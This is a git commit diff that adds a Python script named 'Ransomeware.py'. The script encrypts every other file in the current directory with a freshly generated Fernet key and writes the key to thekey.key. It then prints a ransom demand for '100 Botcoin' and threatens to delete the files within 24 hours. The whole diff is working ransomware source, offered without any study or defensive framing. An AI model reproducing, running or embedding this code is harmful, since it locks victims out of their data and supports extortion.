5a34f708c50c7c5a5a441e5afd73a994d5f34e85
Mangesh1k <69412541+Mangesh1k@users.noreply.github.com>
2022-10-31 22:25:53 +0530

    Update Ransomeware.py

--- Ransomeware.py
+++ Ransomeware.py
@@ -1,1 +1,29 @@
+#!/usr/bin/env python3
 
+
+import os
+from cryptography.fernet import Fernet
+
+files = []
+for file in os.listdir():
+    if file == "Ransomeware.py" or file == "Decrypt.py" or file == "thekey.key":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key","wb") as thekey:
+    thekey.write(key)
+
+for file in files :
+    with open(file,"rb") as thefile:
+        contents = thefile.read()        
+    contents_encrypt = Fernet(key).encrypt(contents)
+    with open(file,"wb") as thefile:
+        thefile.write(contents_encrypt)
+
+
+print("All of your  files have been encrypted !! send me 100 Botcoin or I'll delete them in 24 hour")
